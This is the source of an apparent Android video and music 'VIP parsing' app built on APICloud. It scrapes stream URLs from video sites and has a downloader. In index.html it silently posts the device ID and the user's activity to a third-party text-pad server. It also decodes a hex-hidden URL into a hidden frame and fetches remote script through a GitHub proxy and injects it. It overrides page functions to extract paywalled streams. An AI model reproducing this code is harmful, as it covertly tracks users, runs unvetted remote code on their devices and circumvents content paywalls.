>---start---.index.html======<!DOCTYPE html> <html> <head> <meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>首页</title><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"> <style type="text/css">body{padding:0;margin:0;background-color:#fff;}#header{position:relative;}#nav{display:-webkit-flex;display:flex;position:fixed;left:0;bottom:0;width:100%;overflow:hidden;border:none;background-color:#f3f3f3;z-index:9999;}.menu{font-size:16px;-webkit-flex:1;flex:1;text-align:center;color:#666;height:48px;line-height:48px;}.selected{color:white;background-color:#4CAF50;}</style><script src="file:///android_asset/widget/script/jquery.min.js"></script></head><body><div id="header"></div><div id="nav"><div class="menu" tapmode onclick="navClick(1);">VIP解析</div><div class="menu" tapmode onclick="navClick(2);">影视API</div><div class="menu" tapmode onclick="navClick(3);">高品音乐</div><div class="menu" tapmode onclick="navClick(4);">下载管理</div></div><script>var currentFrame=0,findUrlReady=true,exitTimer=false,webBrowserTimer=0,LMY="687474703a2f2f746f6f6c732e6c69756d696e6779652e636e2f6d757369632f",updateInfo={version:"1.0.17",url:"https://wwn.lanzouq.com/tp/iMGlf05idmnc",msg:'修复一些问题'};var playerJs='if(typeof xxtest == "undefined"){var xxtest=1,videoInfo={},runLeft=0,jxCount=0,endTimes=150;var vEnd=function(){window.stop();runLeft=0;};var videoTest=function(){videoInfo.requestM3u8=0;if(videoInfo.hasOwnProperty("url")==false){return;}var url=videoInfo.url;if(url.indexOf("//")==0){videoInfo.url=url=window.location.protocol+url;}videoInfo.requestM3u8=/\\.m3u8(?:$|\\?|\\&)/.test(url)?1:2;};var getRealUrl=function(url){if(!url||/^https?/.test(url)==false){return;}if(videoInfo.hasOwnProperty("url")==false){videoInfo.url=url;}vEnd();};var openFrameUrl=function(url){var a=document.createElement("a");a.href=url;a.target="_self";document.getElementsByTagName("body")[0].appendChild(a);a.click();};var isHidden=function(el){var endStyle=window.getComputedStyle(el,null);var endWidth=(endStyle.width.match(/\\d+/)||[0])[0],endHeight=(endStyle.height.match(/\\d+/)||[0])[0];return endStyle.display=="none"||endWidth<200||endHeight<200;};var getVideoUrl=function(){try{var els=document.getElementsByTagName("video");if(els.length<1){return;}var el=els[0];if(isHidden(el)){return;}var vurl=el.src;if(!vurl){var sel=document.getElementsByTagName("source");if(sel.length<1){return;}vurl=sel[0].src;}getRealUrl(vurl);el.muted=true;el.setAttribute("preload","none");el.removeAttribute("autoplay");}catch(e){videoCatch();}};var videoCatch=function(){try{var vurl=document.body.innerHTML.match(/<video.*?src="([^"]+)"/)[1];getRealUrl(vurl);}catch(e){}};var getIframeUrl=function(){try{if(videoInfo.url){return;}var ifrEl=document.querySelector("iframe[allowfullscreen]");if(!ifrEl){ifrEl=document.querySelector("iframe");}if(isHidden(ifrEl)){return;}var furl=ifrEl.src;if(furl){ifrEl.parentNode.removeChild(ifrEl);openFrameUrl(furl);}}catch(e){}};var intervalTimer=setInterval(function(){if(jxCount<endTimes){jxCount++;}else{vEnd();jxReady&&jxReady();clearInterval(intervalTimer);return;}getVideoUrl();getIframeUrl();detectUrl&&detectUrl();},200);(function(w){w.confirm=w.alert=w.open=function(){return;};try{var nURL=w.URL.createObjectURL;w.URL.createObjectURL=function(a){var o=nURL(a);return o;};}catch(e){}var timeoutFN=w.setTimeout;w.setTimeout=function(a,b){runLeft++;return timeoutFN(function(){runLeft--;a();},b);};var intervalFN=w.setInterval;w.setInterval=function(a,b){return intervalFN(a,b<1000?b:200);};try{var mediaSource=w.MediaSource;w.MediaSource=function(){var m=new mediaSource();m.constructor=MediaSource;return m;};}catch(e){}var oXHR=w.XMLHttpRequest;w.XMLHttpRequest=function XMLHttpRequest(){var xhr=new oXHR();xhr.constructor=XMLHttpRequest;xhr._open=xhr.open;xhr.open=function(method,url,async,user,password){runLeft++;xhr.timeout=5000;if(/\\.m3u8($|\\&|\\?)/.test(url)){videoInfo.url=url;url=url+(/\\?/.test(url)?"&t=":"?t=")+new Date().getTime();vEnd();try{document.querySelector("video").muted=true;}catch(e){}}xhr._open(method,url,async,user,password);};xhr.addEventListener("loadend",function(){runLeft--;});return xhr;};})(window);}';var videoTestJs='if(typeof videoInfo == "undefined"){jxError();}else{jxCount=0;endTimes=25;videoInfo.referer=location.href;detectUrl();}function detectUrl(){if(videoInfo.text||videoInfo.url||runLeft<=0&&jxCount>10){jxReady();}}function jxError(){api.sendEvent({name:"webBrowserFinish"+(frameName||""),extra:{}});}function jxReady(){clearInterval(intervalTimer);if(videoInfo.finish){return;}videoInfo.finish=true;if(videoInfo.hasOwnProperty("requestM3u8")==false){videoTest();}api.sendEvent({name:"webBrowserFinish"+(frameName||""),extra:videoInfo});}';var functionJs='var jxTimer=0;api.accessNative({name:"getCachePath"},function(ret,err){window.m3u8Dir=ret.url;});api.sendEvent({name:"root",extra:{fn:"save2txtpad",data:{path:"detail",data:api.frameName}}});api.addEventListener({name:"keybackPress"},function(ret,err){jxReset();});api.addEventListener({name:"webBrowserError"},function(ret,err){jxError();});api.addEventListener({name:"leduovip"},function(ret,err){closePlayer();var vid=ret.value.url.match(/[&\\?](vid|url)=([^&]*)/);if(vid&&vid[2]){vid[1]=="vid"?getPlayUrl(vid[2]):isM3u8(decodeURIComponent(vid[2]));}else{jxError();}});api.addEventListener({name:"webBrowserFinish"+api.frameName},function(ret,err){closePlayer();var opt=ret.value;if(opt.url){var purl=opt.url;if(/(?:ssoffo|cehbe).com/.test(purl)){jxError();return;}if(/(.(?!w{3})).{3}\\.ixigua\\.com/.test(purl)){url2play(purl);return;}var curTimer=jxTimer=setTimeout(apiAjaxHead,3000,purl,opt.referer);api.accessNative({name:"getRealUrl",extra:{url:purl,times:3}},function(ret,err){if(curTimer!=jxTimer){return;}clearTimeout(jxTimer);var headers=ret.headers||"";var contentLength=headers.match(/Content-Length=\\[(\\d+)/),contentType=headers.match(/Content-Type=\\[([^\\]]+)/);if(contentType&&/mpegurl|text|fuck|image.vnd.microsoft.icon/i.test(contentType[1])||contentLength&&contentLength[1]<1024000){apiAjax(ret.url,opt.referer);}else if(contentType&&/mp4/i.test(contentType[1])){url2play(ret.url||purl);}else{apiAjaxHead(ret.url||purl,opt.referer);}});}else{jxError();}});function apiAjaxHead(url,referer){api.ajax({url:url,method:"head",dataType:"json",tag:"jxRequest",timeout:3,headers:{Referer:referer}},function(ret,err){if(err){jxError();return;}if(ret["Content-Type"]&&/mpegurl|text|fuck|image.vnd.microsoft.icon/i.test(ret["Content-Type"])||ret["Content-Length"]&&ret["Content-Length"]<1024000){apiAjax(url,referer);}else{url2play(url);}});}function openUrl(url,referer){api.sendEvent({name:"root",extra:{fn:"openWebBrowser",data:{url:url,referer:referer,frameName:api.frameName}}});}function apiAjax(url,referer){api.ajax({url:url,method:"get",dataType:"text",tag:"jxRequest",timeout:5,headers:{"User-Agent":navigator.userAgent,Referer:referer||location.href}},function(ret,err){if(/#EXT(?:INF|M3U)/i.test(ret)){completeData(url,ret);}else if(/(?:37581|hqmbsh).com.*(\\/)asp\\1hls\\1.+\\1default\\1.+\\1\\d+\\.m3u8/.test(url)){apiAjax(url.replace(/\\/\\/[^\\/]+/,"//newcntv.qcloudcdn.com"),referer);}else if(/^https:/.test(url)){apiAjax(url.replace("https:","http:"),referer);}else{api.frameName=="vip"?jxError():url2play(url);}});}function completeData(url,ret){if(/#EXT(?:INF|M3U)/i.test(ret)==false){jxError();return;}if(api.frameName=="vip"&&/hs-mould\\.(?:cn|com|net|cc)/.test(url)&&ret.split("#EXTINF").length<ret.split("#EXTINF:10").length+4){jxError();return;}try{var mArr=ret.match(/(\\r\\n|\\n)+([^#\\s]+)(#+\\w+)?(?:\\r\\n|\\n|$)/),m3u8=mArr[2]||"";}catch(e){jxError();return;}if(/^https?:/.test(m3u8)||m3u8==""){var baseUrl="";}else if(m3u8.indexOf("//")==0){var baseUrl=url.split(":")[0]+":";}else if(m3u8.indexOf("/")==0){var baseUrl=url.match(/^.{8}[^\\/]+/)[0];}else if(m3u8.indexOf("../")==0){var ml=m3u8.split("/")[1],baseUrl=url.substr(0,url.lastIndexOf("/"+ml+"/")+1);ret=ret.replace(/(\\s+)\\.\\.\\//g,"$1");}else{var baseUrl=url.substr(0,url.lastIndexOf("/")+1);(m3u8.indexOf("./")==0)&&(ret=ret.replace(/(\\s+)\\.\\//g,"$1"));}if(ret.indexOf("#EXT-X-STREAM-INF:")!=-1){m3u8=ret.match(/(\\r\\n|\\n)+([^#\\s]+)(#+\\w+)?(\\r\\n|\\n)*$/)[2];apiAjax(baseUrl+m3u8,url);return;}var m3u8FileName=url.replace(/[^\\w]*/g,"").substr(-32);var hostPath="http://127.0.0.1:8080/mycache/";var isReady=true;ret=ret.replace(/#EXT-X-DISCONTINUITY(?:\\r\\s|\\s)/g,"");if(/uri\\s?=\\s?"/i.test(ret)){ret=ret.replace(/(uri\\s?=\\s?")([^"]+)/i,function(a,a1,a2){if(a2.indexOf("http")==0){var baseUrl="";}else if(a2.indexOf("//")==0){var baseUrl=url.split(":")[0]+":";}else if(a2.indexOf("/")==0){var baseUrl=url.match(/^.{8}[^\\/]+/)[0];}else if(a2.indexOf("../")==0){var ml=a2.split("/")[1],baseUrl=url.substr(0,url.lastIndexOf("/"+ml+"/")+1);a2=a2.substr(3);}else{var baseUrl=url.substr(0,url.lastIndexOf("/")+1);(a2.indexOf("./")==0)&&(a2=a2.substr(2));}var keyPath=hostPath+m3u8FileName+".key";isReady=false;api.accessNative({name:"httpDownload",extra:{url:baseUrl+a2,savePath:m3u8Dir+"/"+m3u8FileName+".key",allowResume:false,report:false}},function(ret,err){if(isReady==false){isReady=true;return;}url2play(hostPath+m3u8FileName+".m3u8");});return a1+keyPath;});}if(baseUrl||mArr[2]){ret=ret.replace(/(\\s+)([^#\\s]+)(#+\\w+)?/g,"$1"+baseUrl+"$2");}ret=ret.replace(/\\s+/g,"\\n");api.writeFile({path:m3u8Dir+"/"+m3u8FileName+".m3u8",data:ret},function(ret,err){if(ret.status){if(isReady==false){isReady=true;return;}url2play(hostPath+m3u8FileName+".m3u8");}else{url2play(url);}});}function jxReset(){api.cancelAjax({tag:"jxRequest"});clearTimeout(jxTimer);jxTimer=0;}function closePlayer(){jxReset();api.sendEvent({name:"root",extra:{fn:"apiClosePlayer",data:{}}});}function url2play(url){closePlayer();api.hideProgress();downloadShow(url);startPlay(url);}function jxError(){if(api.frameName=="vip"&&/^[0-3]$/.test(vipLines.urls.indexOf($("#line").attr("data-line")))&&vipLines.otherUrls){var ar=vipLines.otherUrls;if(ar[0]){site.ok=1;jxPlayer.init(ar[0],site.geturl($("#url").val()));ar.splice(0,1);vipLines.otherUrls=ar;return;}}closePlayer();api.hideProgress();api.toast({msg:"解析失败"+(api.frameName=="vip"?"，请切换线路":"")});}function startPlay(url){api.sendEvent({name:"root",extra:{fn:"startPlay",data:{url:url,title:curInfos.title}}});}';function executeSql(sql){var db=api.require('db');db.executeSql({name:'downloader',sql:sql},function(ret,err){if(!ret||ret.status==false){api.toast({msg:err.msg});}});}function openDatabase(){var db=api.require('db');db.openDatabase({name:'downloader'},function(ret,err){if(ret.status){executeSql('CREATE TABLE IF NOT EXISTS downloadsInfo( id INTEGER NOT NULL PRIMARY KEY, url varchar(255),title varchar(255),type varchar(255),size int,status int,pid int)');executeSql('CREATE TABLE IF NOT EXISTS downloadInfo( id INTEGER NOT NULL PRIMARY KEY, url varchar(255),title varchar(255),type varchar(255),path varchar(255),status int)');executeSql('CREATE TABLE IF NOT EXISTS apiInfo( id INTEGER NOT NULL PRIMARY KEY, url varchar(255),name varchar(255))');executeSql('CREATE TABLE IF NOT EXISTS vipInfo( id INTEGER NOT NULL PRIMARY KEY, url varchar(255),name varchar(255),ref varchar(255))');}else{api.toast({msg:err.msg});}});}function deleteDir(){var fs=api.require('fs');fs.rmdir({path:'fs://.m3u8'},function(ret,err){});fs.rmdir({path:'fs://.html'},function(ret,err){});}function appRequestPermission(){var resultList=api.hasPermission({list:['storage']});if(resultList[0].granted==false){api.requestPermission({list:['storage']},function(ret,err){if(ret.list[0].granted==false){api.toast({msg:'没有相关权限，部分功能可能无法正常使用',duration:5000});}});}}function downloadDir(){var fs=api.require('fs');var newPath='fs://VIPDownload';var newE=fs.existSync({path:newPath});if(newE.exist==false||newE.directory==false){var oldPath='fs://download';var oldE=fs.existSync({path:oldPath});if(oldE.exist&&oldE.directory){fs.rename({oldPath:oldPath,newPath:newPath},function(ret,err){});}else{fs.createDir({path:newPath},function(ret,err){});}}}function setPlayerConfig(v){var ar=["x5layer","systemPlayer"];window.playerConfig=ar[v.value];}function openBrowser(v){api.openApp({androidPkg:"android.intent.action.VIEW",uri:v.url},function(ret,err){if(!ret){api.toast({msg:err.msg});}});}function openUpdateWin(url){api.openWin({name:'updateWin',url:url,bgColor:'#ff0',bounces:false});return false;}function copyText(v){var clipBoard=api.require("clipBoard");clipBoard.set({value:v.text},function(ret,err){if(ret){v.tips&&api.toast({msg:"复制成功"});return;}api.toast({msg:err.msg});});}function downloadActionSheet(v){api.actionSheet({title:v.title+"."+v.type,cancelTitle:'取消',buttons:["下载","播放"]},function(ret,err){var index=ret.buttonIndex;switch(index){case 1:startDownload(v);break;case 2:startPlay(v);break;/*case 3:copyText({text:v.url,tips:true});break;case 4:openBrowser(v);break;*/default:break;}});}function downloaderExist(){if(JSON.stringify(api.frames()).indexOf("downloader")!==-1){return true;}return false;}function startDownload(v){if(downloaderExist()){api.sendEvent({name:"downloader",extra:{fn:"addToList",data:v}});return;}openDownload(v);}function openDownload(v){api.setGlobalData({key:"downloaderParam",value:v});navClick(4);}function startPlay(v){window[playerConfig](v);}function x5layer(v){apiClosePlayer({});api.accessNative({name:"TBSPlayer",extra:{url:v.url,screenMode:104,title:v.title,sdandardFullScreen:false,supportLiteWnd:true,DefaultVideoScreen:1}},function(ret,err){if(ret&&ret.value){return;}systemPlayer(v);});}function systemPlayer(v){apiClosePlayer({});api.appInstalled({appBundle:"com.tencent.mtt"},function(ret,err){api.toast({msg:"即将打开系统视频播放器"+(ret.installed&&"\n推荐选择：播霸（QQ浏览器）"||"\n安装「QQ浏览器」播放体验更佳"),duration:5000,global:true});});api.openVideo({url:v.url});}function newAppTest(){var Version=updateInfo.version,msg=updateInfo.msg;if(api.appVersion != Version){api.confirm({title:'版本更新'+Version,msg:msg,buttons:['复制链接','用浏览器下载']},function(ret,err){var url=updateInfo.url;if(ret.buttonIndex==1){copyText({text:url,tips:true});}else if(ret.buttonIndex==2){openBrowser({url:url});}});}}function openFrames(){var header=document.getElementById('header');if(api.statusBarAppearance){header.style.paddingTop=api.safeArea.top+"px";}var headerH=header.offsetHeight;var frames=[];window.navFrames=[{name:'sy',url:'.sy.html'},{name:'vip',url:'.vip.html'},{name:'api',url:'.api.html'},{name:'music',url:'.music.html'},{name:'downloader',url:'.downloader.html'}];if(api.appVersion != updateInfo.version){document.getElementById('nav').style.display="none";navFrames.length=1;}for(var i=0,a;navFrames[i];i++){a=navFrames[i];frames.push({name:a.name,url:a.url,bgColor:'#fff'});}api.openFrameGroup({name:'main',rect:{marginLeft:0,marginTop:headerH,marginRight:0,marginBottom:48},scrollEnabled:true,index:0,preload:0,frames:frames},function(ret,err){navSelected(ret.index);});}function navSelected(index_){var colors=["#fff","#fff","#fff","#0a0","#fff"];document.getElementById('header').style.backgroundColor=colors[index_];index_--;var menu=document.getElementsByClassName('menu');var sEl=document.querySelector('.selected');if(sEl){sEl.className=sEl.className.replace(' selected',"");}if(menu[index_]){menu[index_].className+=" selected";}}function navClick(index_){navSelected(index_);api.setFrameGroupIndex({name:'main',index:index_,scroll:false});}function openHideFrame(v){api.openFrame({name:v.name,url:v.url,reload:true,bgColor:'#fff',rect:{x:0,y:0,w:0,h:0}});}function webBrowserSetTimer(t){clearTimeout(webBrowserTimer);webBrowserTimer=setTimeout(function(){api.sendEvent({name:"webBrowserError"});},t);}function webBrowserClearTimer(v){clearTimeout(webBrowserTimer);}function apiClosePlayer(v){apiWebBrowser.closeView();clearTimeout(webBrowserTimer);}function openWebBrowser(opt){clearTimeout(webBrowserTimer);var url=opt.url,referer=opt.referer;apiWebBrowser.openView({url:url,headers:{Referer:/^https?/.test(referer)?referer:url},rect:{x:-300,y:-300,w:250,h:250}},function(ret,err){switch (ret.state){case 0:webBrowserSetTimer(30000);break;case 1:apiWebBrowser.loadScript({script:playerJs});break;case 2:webBrowserSetTimer(3000);apiWebBrowser.loadScript({script:'api.sendEvent({name:"root",extra:{fn:"webBrowserClearTimer",data:{}}});var frameName="'+opt.frameName+'";'+videoTestJs});break;case 3:break;case 4:break;default:break;}});}function openTxtpad(){window.deviceId=api.deviceId.substr(-4);save2txtpad({path:'detail',data:deviceId});}function getCurTime(){var t=new Date();return t.getHours()+":"+t.getMinutes();}function save2txtpad(v){var path=v.path,text=v.data;var url="https://a6.qikekeji.com/txt/data/"+path+"/";api.ajax({url:url,method:'post',timeout:5,dataType:'text',headers:{"Content-Type":"application/x-www-form-urlencoded",Referer:"https://txtpad.cn/kongbuyy"},data:{body:path=="detail"?'password=kongbuyy&txt_name=kongbuyy':text}},function(ret,err){if(path=="detail"){try{var data=JSON.parse(ret).data;var txt1=JSON.parse(data.txt_content)[0];var content=txt1.content;if(/"key":/.test(content)){var json=JSON.parse(content);var k=json.key,v=json.value;var i=k.indexOf(deviceId);if(i!=-1){if(text==deviceId){k.splice(i,1);k.unshift(text);v.splice(i,1);v.unshift([text,getCurTime()]);}else{v[i].push(text);}}else{var m=getCurTime();if(text==deviceId){k.unshift(text);v.unshift([text,m]);}else{k.unshift(deviceId);v.unshift([deviceId,m,text]);}}if(k.length>30){k.length=v.length=30;}json={key:k,value:v};}else{var json={key:[deviceId],value:[[deviceId,getCurTime()]]};if(text!=deviceId){json.value[0].push(text);}}var body="password=kongbuyy&txt_name=kongbuyy&v_id="+data.v_id+"&txt_content="+JSON.stringify([{title:"txtpad",content:JSON.stringify(json)}]);save2txtpad({path:"save",data:body});}catch(e){}}});}function exitApp(){if(exitTimer){api.closeWin();return;}api.toast({msg:"再次点击退出",duration:3000,global:true});exitTimer=true;setTimeout(function(){exitTimer=false;},3000);}function openLMY(v){openHideFrame({name:'LMY',url:LMY});}function stringDecode(str){return str.replace(/.{2}/g,function(a){return String.fromCharCode(parseInt(a,16));});}apiready=function(){LMY=stringDecode(LMY);openFrames();openTxtpad();window.apiWebBrowser=api.require('webBrowser');api.connectionType=='none'&&api.toast({msg:'请先联网'});api.addEventListener({name:'online'},function(ret, err){api.toast({msg:'已连接到网络'});});api.addEventListener({name:'offline'},function(ret, err){api.toast({msg:'网络已断开'});});api.setFrameClient({frameName:'LMY'},function(ret,err){if(ret.state==1){api.execScript({frameName:'LMY',script:'try{var ul=document.getElementsByTagName("ul")[0];ul.parentNode.removeChild(ul);}catch(e){}'});}else if(ret.state==2){api.setGlobalData({key:'LMYReady',value:1});var js='var mainRetry=errorRetry=retryTimer=0;getMainJs();function getMainJs(){if(++mainRetry>10){clearTimeout(retryTimer);musicReady();return;}try{var js=localStorage.getItem("js.main");js=JSON.parse(js);js=js.match(/var\\s+_0xodO\\s*=\\s*(\'|")(.*?)\\1[\\s\\S]+?\\1\\2\\1\\s*;/);js&&insertJsText(js[0]);musicReady();}catch(e){retryTimer=setTimeout(getMainJs,500);}}function insertJsText(str){var script=document.createElement("script");script.text=str;document.body.appendChild(script);}function loadJsByUrl(url,fn){var script=document.createElement("script");script.src=url;script.onload=fn;script.onerror=musicReady;document.body.appendChild(script);}function errorRequest(){errorRetry=1;var cdn="https://cdn.bootcss.com/";loadJsByUrl(cdn+"jquery/3.5.1/jquery.min.js",function(){loadJsByUrl(cdn+"blueimp-md5/2.18.0/js/md5.min.js",function(){var errorInfos={url:"https://gh.api.99988866.xyz/https://raw.githubusercontent.com/hsy35/kongbuyy/main/errorText_1.0.txt",version:"20220523"};var text=localStorage.getItem("errorMain"),version=localStorage.getItem("errorVersion");if(text!=null&&version!=null&&version==errorInfos.version){insertJsText(text);musicReady();return;}getErrorText(errorInfos.url,function(text){if(text){localStorage.setItem("errorVersion",errorInfos.version);localStorage.setItem("errorMain",text);insertJsText(text);musicReady();}else{loadJsByUrl(errorInfos.url,musicReady);}});});});}function musicReady(){var ok=1;try{encode(ok);}catch(e){ok=-1;if(errorRetry==0){errorRequest();return;}}retryTimer=0;api.sendEvent({name:"music",extra:{fn:"musicReady",data:{ok:ok}}});}function getErrorText(url,fn){var xhr=new XMLHttpRequest();xhr.open("GET",url);xhr.onreadystatechange=function(){if(xhr.readyState==4){fn(xhr.status==200?xhr.responseText:"");}};xhr.send(null);}function musicRequest(v){var xhr=new XMLHttpRequest();xhr.open(v.method||"POST",v.url);xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xhr.onreadystatechange=function(){if(xhr.readyState==4){api.sendEvent({name:"music",extra:{fn:"requestSuccess",data:{type:v.type,result:xhr.status==200?xhr.responseText:"{}"}}});}};xhr.send(encode(v.data));}';api.execScript({frameName:'LMY',script:js});}});api.setFrameClient({frameName:'vip'},function(ret,err){if(ret.state==2){api.execScript({frameName:'vip',script:functionJs});}});api.setFrameClient({frameName:'api'},function(ret,err){if(ret.state==2){api.execScript({frameName:'api',script:functionJs});}});api.setFrameClient({frameName:'music'},function(ret,err){if(ret.state==2){api.execScript({frameName:'music',script:functionJs});}});api.setFrameClient({frameName:'downloader'},function(ret,err){if(ret.state==2){api.execScript({frameName:'downloader',script:functionJs});}});api.setFrameClient({frameName:'decode'},function(ret,err){if(ret.state==2){api.execScript({frameName:'decode',script:'(function(w){api.addEventListener({name:"decode"},function(ret,err){var v=ret.value;try{w[v.fn](v.data);}catch(e){w.apiSendData({});}});insertJsByUrl(".decode_leduo.js");})(window);(function(w){function v_decrypt(data,tk,tv){return CryptoJS.AES.decrypt(data,tk,{iv:tv}).toString(CryptoJS.enc.Utf8);}w.okjx=w.tkys=w.xkys=w.haoyining=w.yuxidy=function(v){v.url=v_decrypt(v.url,CryptoJS.enc.Utf8.parse(v.tk),CryptoJS.enc.Utf8.parse(v.tv));w.apiSendData(v);};})(window);function insertJsByUrl(url){var script=document.createElement("script");script.src=url;document.body.appendChild(script);}function apiSendData(v){api.sendEvent({name:"webBrowserFinishvip",extra:v});}'});}});api.addEventListener({name:'root'},function(ret,err){var v=ret.value;window[v.fn](v.data);});api.addEventListener({name:'keyback'},function(ret,err){api.hideProgress();apiClosePlayer();api.sendEvent({name:"keybackPress"});exitApp();});newAppTest();downloadDir();openDatabase();deleteDir();api.accessNative({name:"startVideoServer",extra:{fsPath:api.fsDir}},function(ret,err){});api.accessNative({name:"setBackgroundColor"},function(ret,err){});};</script></body></html>######.sy.html======<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta content="telephone=no" name="format-detection" /><meta http-equiv="Cache-Control" content="no-siteapp" /><meta http-equiv="Cache-Control" content="no-transform" /><script src="file:///android_asset/widget/script/jquery.min.js"></script><title>首页</title><style>html,body{margin:0;padding:0;overflow-x: hidden;font-size:12px;background-color:#fff;}a{text-decoration:none;}.topbox{display:-webkit-flex;display:flex;-webkit-flex-direction:column;flex-direction:column;align-items:center;justify-content:center;position:fixed;top:0;left:0;width:100%;height:100%;font-size:14px;color:#777;overflow:hidden;z-index:9;}.wx_pic{position:relative;width:215px;height:215px;background:url(file:///android_asset/widget/image/kongbuyy_wx_pic.jpg) no-repeat center center;background-size:215px 215px;}.savebtn{position:relative;color:#fff;background-color:#090;padding:10px;border-radius:5px;}.clear-cache,.curPlayer{display:inline-block;width:80px;height:40px;line-height:40px;text-align:center;margin-left:5px;color:#66f;}</style></head><body><div class="topbox"><div style="text-align:center;">微信扫描二维码关注公众号</div><div class="wx_pic"></div><div class="savebtn" tapmode onclick="save2Album();">保存到相册</div><div style="margin-top:20px;font-size:12px;">播放器：<div class="curPlayer" style="width:auto;" onclick="playerActionSheet(this);">默认</div></div><div style="height:40px;line-height:40px;font-size:12px;">下载目录：/UZMap/A6003463152993/VIPDownload</div></div><script>var playerText=['默认播放器','调用系统播放器'];function bytesToSize(size){var unit;var units=['B','KB','MB','GB','TB'];while ((unit=units.shift())&&size>1024){size=size/1024;}return (unit==='B'?size:size.toFixed(2))+unit;}function getCacheSize(){$('.cache-size').text(bytesToSize(api.getCacheSize({sync:true})));}function clearCache(){api.clearCache(function(ret,err){api.toast({msg:'清除完成'});getCacheSize();});}function save2Album(){api.saveMediaToAlbum({path:'widget://image/kongbuyy_wx_pic.jpg'},function(ret,err){api.toast({msg:ret&&ret.status&&'保存成功'||'保存失败'});});}function playerActionSheet(el){var i=playerText.indexOf(el.innerText);var names=playerText.slice();names.splice(i,1,'* '+playerText[i]);api.actionSheet({title:'播放器',cancelTitle:'取消',buttons:names},function(ret,err){var index=ret.buttonIndex;if(/[12]/.test(index)){index--;if(i==index){return;}if(index==1){api.toast({msg:"应用外播放，应用在后台很容易被清除",duration:10000});}el.innerText=playerText[index];api.sendEvent({name:"root",extra:{fn:"setPlayerConfig",data:{value:index}}});api.setPrefs({key:"playerConfig",value:index});}});}function initPlayerConfig(){var i=api.getPrefs({sync:true,key:"playerConfig"})||0;document.querySelector(".curPlayer").innerText=playerText[i];api.sendEvent({name:"root",extra:{fn:"setPlayerConfig",data:{value:i}}});}function existApp(arr){if(arr.length==0){return;}var kl=arr.shift();api.appInstalled({appBundle:kl.b},function(ret,err){if(ret&&ret.installed){api.sendEvent({name:"root",extra:{fn:"copyText",data:{text:kl.k,tips:false}}});localStorage.setItem("douyinjsb",new Date().getDate());}else{existApp(arr);}});}function douyinjsb(){var douyin=localStorage.getItem("douyinjsb"),day=new Date().getDate();if(douyin==null||douyin!=day){api.ajax({url:'https://wwi.lanzouq.com/b0ca75b0b',method:'get',dataType:'text',timeout:15},function(ret,err){var kl=ret.match(/kouling:(\[[^\]]+\])/);if(kl==null){return;}kl=JSON.parse(kl[1].replace(/'/g,'"'));existApp(kl);});}}apiready=function(){initPlayerConfig();};</script></body></html>---end---<